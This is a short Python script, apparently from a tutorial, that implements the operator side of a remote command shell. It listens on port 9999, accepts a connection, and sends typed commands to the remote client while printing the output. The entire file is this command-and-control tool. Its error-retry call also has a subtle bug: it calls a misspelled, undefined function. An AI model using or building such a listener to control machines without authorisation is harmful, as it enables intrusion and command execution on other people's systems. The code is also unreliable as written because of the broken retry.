import sys #helps implement command prompt and terminal commands in python
import socket #library containes definitions and methods to connect computers

#defining a socket to connect two computers
def create_socket():
	try:
		global host 
		global port
		global s
		host="" # ip address of host
		port=9999 # uncommon port, not used frequently, trying to avoid commonly used port
		s = socket.socket() # function used to create a socket
		
	except socket.error as msg:
		print("socket creation error "+str(msg))
	
# binding port and host together with socket and also listening to connections
def bind_socket():
	try:
		global host
		global port
		global s
		
		print("binding the port "+str(port))
		
		s.bind((host, port)) # binding the host and port using bind function, the parameter of host and port is passed as a tuple
		s.listen(5) # listening to connections , the parameter specifies the number of bad connections the computer will listen to before throwing exception. If good connection is found, normal flow of program execution will take place.
		
	except socket.error as msg:
		print("socket binding error"+str(msg)+"\n"+"Retrying...")
		bind_Socket()

# establishing connection with a client(socket must be listening)		
def socket_accept():
	conn, address = s.accept() # address stores ip address and port, conn is an object of created connection with the particular client
	print("connection has been established "+"ip-"+address[0]+"port-"+str(address[1]))
	send_command(conn)
	conn.close()

# defining send_Command function which will send commands to client	
def send_command(conn):
	while True:
		cmd = input()
		if cmd=="quit":
			conn.close()
			s.close()
			sys.exit()
			
		if len(str.encode(cmd))>0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "utf-8")
			print(client_response, end="")
			
def main():
	create_socket()
	bind_socket()
	socket_accept()
	
main()
	
	
	
	
	
	
	
	
	
	
	
	
	
